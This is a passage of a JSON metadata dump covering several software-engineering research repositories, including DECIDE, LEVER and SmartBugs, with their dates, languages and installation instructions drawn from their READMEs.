                    "value": "https://github.com/KKZ20/DECIDE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Installation\n\nIn this file we present the installation steps for running DECIDE. To help users know more details on the whole pipeline, we also provide installation instructions for running an example of knowledge extracting and and example of knowledge graph querying.\n\n## DECIDE\n\nHere we provide instructions on how to set up our tools, DECIDE. DECIDE can be installed either locally or in Docker.\n\n### Local Installation\n\nTo set up DECIDE, please ensure that you have installed [Python](https://www.python.org/) and [Anaconda](https://www.anaconda.com/). Note that all the code were tested on Ubuntu 18.04 without using GPU.\n\nFirst, install [Neo4j](https://neo4j.com/). The tested version is v4.4.8. Please load the knowledge graph by running:\n\n```shell\n$ cd /PATH/TO/DECIDE\n$ cp DECIDE-KnowledgeGrpah.dump /PATH/TO/NEO4J/data/databases/\n$ cd /PATH/TO/NEO4J\n$ bin/neo4j stop\n$ # Dump the knowledge graph\n$ bin/neo4j-admin load --from=data/databases/DECIDE-KnowledgeGrpah.dump\n$ # Start Neo4j\n$ bin/neo4j start\n```\n\n Then change the configuration in `DECIDE/config/neo4j.json`:\n\n```json\n{\n    \"protocol\": \"http\",\n    \"host\": \"YOUR HOST\",\n    \"port\": \"YOUR PORT\",\n    \"user\": \"YOUR USERNAME\",\n    \"password\": \"YOUR PASSWROD\"\n}\n```\n\nNote that we provide an on-line Neo4j service, the configuration are as follows:\n\n```json\n{\n    \"protocol\": \"http\",\n    \"host\": \"116.62.100.101\",\n    \"port\": \"22467\",\n    \"user\": \"neo4j\",\n    \"password\": \"so-knowledge-summer-20220725-467\"\n}\n```\n\nWe strongly recommend users to reproduce our code in a new virtual Python environment.  One can create a new environment using Anaconda:\n\n```shell\n$ conda create -n YOUR_ENV_NAME python=3.6 -y\n$ conda activate YOUR_ENV_NAME\n```\n\nTo install all the required libraries for DECIDE, run:\n\n```shell\n$ cd PATH/TO/DECIDE\n$ pip install -r requirements.txt \n```\n\nTo test the project in our benchmarks, run:\n\n```shell\n$ python main.py -n PROJECT_NAME\n$ # example: python main.py -n gcn\n```\n\nTo replay the evaluation in our benchmark, please run:\n\n```shell\n$ chmod +x experiment.sh\n$ ./experiment.sh\n```\n\nThe results will be generated in `DECIDE/detection_result`.\n\n### Docker Installation\n\nAfter Docker is installed,  change the working directory to `Docker` folder in the repository with:\n\n```shell\n$ cd PATH/TO/DECIDE/Docker\n```\n\nStart the docker container with the following command:\n\n```sh\n$ docker compose up\n```\n\nYou should see the following output.\n\n<img src=\"./DECIDE/imgs/docker_up.png\" alt=\"Supervised\" style=\"zoom: 80%;\" />\n\n\n\nBy now, you should be able to see a running docker container named `docker` in your docker desktop.\n\n<img src=\"./DECIDE/imgs/docker_one.png\" alt=\"Supervised\" style=\"zoom:80%;\" />\n\n\n\nThe `docker` container should contain two separate docker containers (`myneo4j` and `decide`). Proceed to the terminal of `decide`:\n\n<img src=\"./DECIDE/imgs/two_container.png\" alt=\"Supervised\"  />\n\nNow, you can run DECIDE and reproduce all our experimental results following the instructions from the README file. For example, try running:\n\n```shell\n$ python3 main.py -n gcn\n```\n\nYou should see the following output:\n\n<img src=\"./DECIDE/imgs/script.png\" alt=\"Supervised\"  />\n\n## Knowledge Extraction Examples\n\nFirst, create a new virtual Python environment using Anaconda:\n\n```shell\n$ conda create -n YOUR_ENV_NAME python=3.6 -y\n$ conda activate YOUR_ENV_NAME\n```\n\nThen, install all the required libraries for constructing the knowledge graph, run:\n\n```shell\n$ cd PATH/TO/DECIDE/Knowledge-Extraction-Example/\n$ pip install -r requirements.txt \n$ pip install en_core_web_sm-2.3.1.tar.gz\n```\n\nTo get a quick view on knowledge extraction pipeline, run:\n\n```shell\n$ cd PATH/TO/DECIDE/Knowledge-Extraction-Example/\n$ python example.py\n```\n\n## Knowledge Graph Query Examples\n\nFirst, install Neo4j (see above) and change the configuration file `DECIDE/Knowledge-Base-Query-Example/config.json`:\n\n```\n{\n    \"protocol\": \"http\",\n    \"host\": \"YOUR HOST\",\n    \"port\": \"YOUR PORT\",\n    \"user\": \"YOUR USERNAME\",\n    \"password\": \"YOUR PASSWROD\"\n}\n```\n\nThen, create a new virtual Python environment using Anaconda:\n\n```shell\n$ conda create -n YOUR_ENV_NAME python=3.6 -y\n$ conda activate YOUR_ENV_NAME\n```\n\nThen, install all the required libraries:\n\n```shell\n$ pip install py2neo \n```\n\nTo get a quick view on knowledge graph Query Examples, run:\n\n```shell\n$ cd PATH/TO/DECIDE/Knowledge-Base-Query-Example/\n$ python example.py\n```\n\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/KKZ20/DECIDE/main/Installation.md"
            },
            {
                "result": {
                    "value": "\r\nPlease refer to [Requirements.md](./Requirements.md) and [Installation.md](./Installation.md).\r\n\r",
                    "type": "Text_excerpt",
                    "original_header": "Prerequisites &amp; Installation",
                    "parent_header": [
                        "Knowledge-based Version Incompatibility Detection for Deep Learning <a href=\"https://arxiv.org/abs/2308.13276\"><img alt=\"\" src=\"https://img.shields.io/badge/arXiv-2308.13276-b31b1b.svg\" /></a> <a href=\"https://zenodo.org/doi/10.5281/zenodo.10211987\"><img alt=\"DOI\" src=\"https://zenodo.org/badge/681461566.svg\" /></a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/KKZ20/DECIDE/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-22T04:23:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-11T05:55:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 148068
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1396
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "344": {
        "filename": "clowee_The-Technical-Debt-Dataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/clowee/The-Technical-Debt-Dataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-06-05T10:09:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-18T08:54:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "345": {
        "filename": "marcusm117_IdentityChain_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/marcusm117/IdentityChain",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Create and Activate a Conda Environment.\n\n   ``` bash\n   conda create -n idchain python=3.10\n   conda activate idchain\n   ```\n\nInstall from PyPI with all Dependencies.\n\n   ``` bash\n   pip3 install identitychain\n   pip3 install -r requirements.txt\n   ```\n\nInstall from Source with all Dependencies.\n\n   ``` bash\n   git clone https://github.com/marcusm117/IdentityChain.git\n   cd IdentityChain\n   make develop\n   ```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "IdentityChain"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/marcusm117/IdentityChain/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- `make format`: autoformat  this library with `black`\n- `make lint`: perform static analysis of this library with `black` and `flake8`\n- `make annotate`: run type checking using `mypy`\n- `make test`: run automated tests\n- `make check`: check assets for packaging \nMake sure that `make lint`, `make test`, and `make check` all pass locally before submitting a Pull Request.\n \n",
                    "original_header": "Linting &amp; Testing"
                },
                "confidence": 0.9891750421241963,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/marcusm117/IdentityChain/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-10-02T11:41:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-15T02:50:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 120025
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2704
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 77
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "346": {
        "filename": "niansong1996_lever_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/niansong1996/lever",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "(Recommended) Create a new conda environment\n```bash\nconda create -n lever python=3.8\nconda activate lever\n```\nInstall the dependencies\n```bash\npip install -r requirements.txt\n```\n> **NOTE**: all of the pipelines are only tested on Linux machines, you may need to build your own `tree-sitter` parsers if a different platform is used.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "LEVER: Learning to Verify Language-to-Code Generation with Execution",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/niansong1996/lever/main/README.md"
            },
            {
                "result": {
                    "value": "> We share only the verification data, which is essential to reproduce our results, under the [CC-BY-NC 4.0](https://creativecommons.org/licenses/by-nc/4.0/) license. For the original datasets, please refer to their own pages. \n\nDownload the data from [here](https://drive.google.com/file/d/1pxFSnQVZKTJ9uAeZWiMopMbP8pdWK7GI/view?usp=sharing) and create a `data` folder:\n```bash\ncd lever\nmkdir data\ncd data\nunzip lever_verification_data.zip\n```\nAfter this, make sure your `data` directory looks something like this:\n```\ndata\n|-- gsm8k\n|   |-- ...\n|-- mbpp\n|   |-- ...\n|-- spider \n|   |-- ...\n|-- wikitq\n|   |-- wikitq_codex_verification_dev.jsonl\n|   |-- wikitq_codex_verification_test.jsonl\n|   |-- wikitq_codex_verification_train.jsonl\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Data",
                    "parent_header": [
                        "LEVER: Learning to Verify Language-to-Code Generation with Execution",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/niansong1996/lever/main/README.md"
            },
            {
                "result": {
                    "value": "(For Codex) Set up OpenAI API key. Either put this line in your `~/.bashrc` (or equivalent), or add this line to every inference commands:\n```bash\nexport OPENAI_API_KEY=<your key, should start with \"sk-\">\n```\n\n(For experiment logging) Prepend `export EXP_NAME=<your exp name>` to the python commands to log to `wandb`, for example:\n```bash\nexport EXP_NAME=lever-reproduce-mbpp; \n```\nBut you may need to setup a W&B account first (you may follow the instructions [here](https://docs.wandb.ai/ref/cli/wandb-login)). Then change the following lines in `trainer.logger+` fields of the `yaml` config file you would like to run:\n```yaml\nentity: <your-user/org-name>\nproject: <your-project-name>\n```\n\n(Common error) At any point, if you met with the Python import problem (e.g., `ModuleNotFoundError`), try doing this in the main (`lever`) directory:\n```bash\nexport PYTHONPATH=`pwd`\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Optional Setups",
                    "parent_header": [
                        "LEVER: Learning to Verify Language-to-Code Generation with Execution",
                        "Setup"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/niansong1996/lever/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"left\">\n    <a href=\"https://img.shields.io/github/license/niansong1996/lever\">\n        <img src=\"https://img.shields.io/github/license/niansong1996/lever\">\n    </a>\n    <a href=\"https://img.shields.io/github/last-commit/HKUNLP/Binder?color=green\">\n        <img src=\"https://img.shields.io/github/last-commit/HKUNLP/Binder?color=green\">\n    </a>\n    <a href=\"https://img.shields.io/badge/PRs-Welcome-red\">\n        <img src=\"https://img.shields.io/badge/PRs-Welcome-red\">\n    </a>\n    <br/>\n</p> \n",
                    "original_header": "LEVER: Learning to Verify Language-to-Code Generation with Execution"
                },
                "confidence": 0.9999999999951115,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/niansong1996/lever/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-16T06:01:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-20T11:55:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 230124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "347": {
        "filename": "zhongxingyu_Seer_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zhongxingyu/Seer",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We split the whole data set into 10 folds, with each fold having the same number of instances for each kind of repair transform (for \u201csingle-transform\u201d case) and same number of \u201cmultiple-transform\u201d instances. We select one fold as test data set to see the model performance. To facilate the investigation of the performance of the trained model for each kind of transform, we explictly list the instances for each kind of transform in the \u201cTest-Data\u201d folder. The other 9 folds are used as the training data set and we use cross-validation to investigate the impact of the parameters and select them accordingly. We evaluate the error rate on each fold by training a model on the other 8 folds. The error rate is established using the top-3 evaluation metric described in the paper. We repeat this process by using a set of different parameters and aim to identify parameters with the lowest error rate. Our CRF model contains three parameters: the regularization parameter &#963; <sup>2</sup>, the parameter *q* that determines the magnitude of the distribution-aware prior, and the L-BFGS iteration parameter *G*. The three folders \u201cAll-Training-Data\u201d, \u201c70%-Training-Data\u201d, and \u201c30%-Training-Data\u201d in the \u201cTraining-Data\u201d folder correspond to the case that we respectively use 100%, 70% , and 30% of the whole training data to build the model. In other words, for each kind of repair transform (including \u201cmultiple-transform\u201d kind), we respectively select 70% and 30% of the instances in the whole training data for it to build partial models.           \n",
                    "type": "Text_excerpt",
                    "original_header": "Notes about training and test data sets",
                    "parent_header": [
                        "Structural Code Transform Prediction on AST Nodes"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/zhongxingyu/Seer/master/README.md"
            },
            {
                "result": {
                    "value": "The two kinds of feature functions in our CRF and the constraint on the admissible repair transforms over AST nodes will rely on the training data. In addition, the other history probability baseline also makes use of the training data. To establish the CRF and the history probability baseline, use the following command: \n```\njava -cp CRF.jar FileParse.CRFEstablish /path/to/training-data /path/to/store-initial-CRF /path/to/store-history-probability-baseline onlyobservation? onlyindicator?\n```\nIn the above command, the first three arguments specify the path to the training data, the path to store the established initial CRF, and the path to store the established history probability baseline, the last two boolean arguments specify whether the CRF only uses observation-based feature functions and only uses indicator-based feature functions respectively. The established CRF (a json file) has representations for constraints about admissible repair transforms over AST nodes and different kinds of feature functions (the weights for them are zero and are to learn). The established history probability baseline is a txt file and contains a set of tuples <*L*, *T*, *P*> as described in section 6.2 of the paper.\n\nFor instance, to generate the CRF which uses both observation-based and indicator-based feature functions (let it be named `CRF-all.json` and in a folder named `CRF-Model`, here suppose we use all training data) and the history probability baseline (let it be named `history-probability-baseline.txt` and again in folder `CRF-Model`), use the following command (suppose the CRF.jar is not moved and the command is run in folder `CRF-Transform-Prediction`):\n```\njava -cp ./target/CRF.jar  FileParse.CRFEstablish ../Training-Data/All-Training-Data ../CRF-Model/CRF-all.json ../CRF-Model/history-probability-baseline.txt false false\n```\nBy replacing the first `false` argument with `true`, the CRF which uses only observation-based feature functions will be generated. By replacing the second `false` argument with `true`, the CRF which uses only indicator-based feature functions will be generated. \n",
                    "type": "Text_excerpt",
                    "original_header": "Step 2: CRF setup",
                    "parent_header": [
                        "Structural Code Transform Prediction on AST Nodes",
                        "Usage and paper result reproduction"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/zhongxingyu/Seer/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-28T11:07:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-14T00:01:12Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "348": {
        "filename": "soarsmu_Compressor_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/soarsmu/Compressor",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To reproduce our experiments, machines with GPUs and NVIDIA CUDA toolkit are required. \nWe provide a `Dockerfile` to help build the experimental environment. Please run the following scripts to compile a docker image:\n```\ndocker build -t YOUR_CUSTOM_TAG .\n```\nBe careful with the torch version that you need to use, modify the `Dockerfile` according to your cuda version pls. \nGraphCodeBERT need a parser to extract data flows from the source code, please go to `./parser` to compile the parser first. Pls run:\n```\ncd parser\nbash build.sh\n```\n \n",
                    "original_header": "Environment configuration"
                },
                "confidence": 0.9837833033151547,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/soarsmu/Compressor/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-12-01T07:11:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-09T11:42:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 445152
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1109
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 739
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "349": {
        "filename": "ideas-labo_mmo_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ideas-labo/mmo",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-10-25T14:31:28Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-29T11:19:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 77825
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "350": {
        "filename": "LJ2lijia_SkCoder_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/LJ2lijia/SkCoder",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Then, you can run the inference script to generate the code for the test data.\n```Bash\ncd editor/sh\npython run_exp.py --task hearthstone --gpu {gpu_ids}\n```\n \n",
                    "original_header": "Releasing a trained model"
                },
                "confidence": 0.9996974511383012,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/LJ2lijia/SkCoder/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-10T14:11:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-19T06:56:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 237568
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 7922
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 7044
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "351": {
        "filename": "ai-se_defect_perceptions_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ai-se/defect_perceptions",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-04-05T16:08:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-04-08T02:01:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "352": {
        "filename": "NEUIR_INTERVENOR_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/NEUIR/INTERVENOR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In the initial step (**Step A^0**, where 0 signifies the initial turn), we prompt the Code Learner to generate code for the given task. Subsequently, the Code Learner executes the generated code using the code compiler to assess its correctness (**Step B**). Following this, the Code Teacher generates code repair instructions (CoR) based on the bug report and the associated buggy code (**Step C**). These instructions elucidate the reason of the bug, such as ``modified to handle the case where the input decimal is 0``, and include code correction planning, for example, ``we can simply return db0db``. Such instructions are informative and enhance the guidance for the Code Learner. Ultimately, the Code Learner follows the chain-of-repair (CoR) to rectify the code and subsequently resubmits the corrected version to the compiler for execution in the subsequent turn ((**Step A^i**), where i\u22651 denotes the code repair process). The A^i, B, and C steps are iterated sequentially until either the code meets the compiler's estimation or the maximum turn limit is reached.\n![model](assets/model.gif)\n## Requirements \nInstall dependencies:\n```\ngit clone https://github.com/NEUIR/INTERVENOR.git\ncd INTERVENOR\npip install -r requirements.txt\npip install -e human-eval\n```\n \nFor more detailed testing steps, please refer to [HumanEval Repo](https://github.com/openai/human-eval)\n```bash\nevaluate_functional_correctness {result path} --problem_file={problem_path}\n```\n \n",
                    "original_header": "INTERVENOR"
                },
                "confidence": 0.9915039973691678,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/NEUIR/INTERVENOR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-11-15T10:30:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T16:47:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 121638
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4991
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1681
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "353": {
        "filename": "smartbugs_smartbugs_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/smartbugs/smartbugs",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. Install  [Docker](https://docs.docker.com/install) and [Python3](https://www.python.org).\n\n   Make sure that the user running SmartBugs is allowed to interact with the Docker daemon, by adding the user to the `docker` group:\n\n   ```bash\n   sudo usermod -a -G docker $USER\n   ```\n   For adding another user, replace `$USER` by the respective user-id. The group membership becomes active with the next log-in.\n\n2. Clone [SmartBugs's repository](https://github.com/smartbugs/smartbugs):\n\n   ```bash\n   git clone https://github.com/smartbugs/smartbugs\n   ```\n\n3. Install Python dependencies in a virtual environment:\n\n   ```bash\n   cd smartbugs\n   install/setup-venv.sh\n   ```\n\n4. Optionally, add the executables to the command search path, e.g. by adding links to `$HOME/bin`.\n\n   ```bash\n   ln -s \"`pwd`/smartbugs\" \"$HOME/bin/smartbugs\"\n   ln -s \"`pwd`/reparse\" \"$HOME/bin/reparse\"\n   ln -s \"`pwd`/results2csv\" \"$HOME/bin/results2csv\"\n   ```\n\n   The command `which smartbugs` should now display the path to the command.\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Unix/Linux",
                    "parent_header": [
                        "SmartBugs: A Framework for Analysing Ethereum Smart Contracts",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/smartbugs/smartbugs/master/README.md"
            },
            {
                "result": {
                    "value": "See [our wiki page on running SmartBugs in Windows](https://github.com/smartbugs/smartbugs/wiki/Running-SmartBugs-in-Windows).\n",
                    "type": "Text_excerpt",
                    "original_header": "Windows",
                    "parent_header": [
                        "SmartBugs: A Framework for Analysing Ethereum Smart Contracts",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/smartbugs/smartbugs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "![SmartBugs tests](https://github.com/smartbugs/smartbugs/actions/workflows/ubuntu.yml/badge.svg)\n <a href=\"https://github.com/smartbugs/smartbugs/releases\"><img alt=\"Smartbugs release\" src=\"https://img.shields.io/github/release/smartbugs/smartbugs.svg\"></a>\n<a href=\"https://github.com/smartbugs/smartbugs/blob/master/LICENSE\"><img alt=\"Smartbugs license\" src=\"https://img.shields.io/github/license/smartbugs/smartbugs.svg?color=blue\"></a>\n<span class=\"badge-crypto\"><a href=\"#support-and-donate\" title=\"Donate to this project using Cryptocurrency\"><img src=\"https://img.shields.io/badge/crypto-donate-red.svg\" alt=\"crypto donate button\" /></a></span>\n<a href=\"#Supported-Tools\"><img alt=\"analysis tools\" src=\"https://img.shields.io/badge/analysis tools-20-blue\"></a> \n",
                    "original_header": "SmartBugs: A Framework for Analysing Ethereum Smart Contracts"
                },
                "confidence": 0.9999999999786269,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/smartbugs/smartbugs/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "|      | version | Solidity | bytecode | runtime code |\n| :--- | :--- | :---: | :---: | :--: |\n| [ConFuzzius](https://github.com/christoftorres/ConFuzzius) | #4315fb7 v0.0.1 | :heavy_check_mark: |                    |                    |\n| [Conkas](https://github.com/smartbugs/conkas)        | #4e0f256 | :heavy_check_mark: |                    | :heavy_check_mark: |\n| [Ethainter](https://zenodo.org/record/3760403)               |  |                    |                    | :heavy_check_mark: |\n| [eThor](https://secpriv.wien/ethor)           | 2023 |                    |                    | :heavy_check_mark: |\n| [HoneyBadger](https://github.com/christoftorres/HoneyBadger) | #ff30c9a | :heavy_check_mark: |                    | :heavy_check_mark: |\n| [MadMax](https://github.com/nevillegrech/MadMax) | #6e9a6e9     |                    |                    | :heavy_check_mark: |\n| [Maian](https://github.com/smartbugs/MAIAN)          | #4bab09a | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |\n| [Manticore](https://github.com/trailofbits/manticore)   | 0.3.7 | :heavy_check_mark: |                    |                    |\n| [Mythril](https://github.com/ConsenSys/mythril)       | 0.24.7 | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark: |\n| [Osiris](https://github.com/christoftorres/Osiris)        | #d1ecc37 | :heavy_check_mark: |                    | :heavy_check_mark: |\n| [Oyente](https://github.com/smartbugs/oyente)        | #480e725 | :heavy_check_mark: |                    | :heavy_check_mark: |\n| [Pakala](https://github.com/palkeo/pakala)   | #c84ef38 v1.1.10 |                    |                    | :heavy_check_mark: |\n| [Securify](https://github.com/eth-sri/securify)              |  | :heavy_check_mark: |                    | :heavy_check_mark: |\n| [Semgrep](https://github.com/Decurity/semgrep-smart-contracts)  | #c3a9f40 | :heavy_check_mark: |                    |                    |\n| [sFuzz](https://github.com/duytai/sFuzz) | #48934c0 (2019-03-01) | :heavy_check_mark: |  |  |\n| [Slither](https://github.com/crytic/slither)  | 0.10.0 | :heavy_check_mark: |                    |                    |\n| [Smartcheck](https://github.com/smartdec/smartcheck)         |  | :heavy_check_mark: |                    |                    |\n| [Solhint](https://github.com/protofire/solhint)         | 3.3.8 | :heavy_check_mark: |                    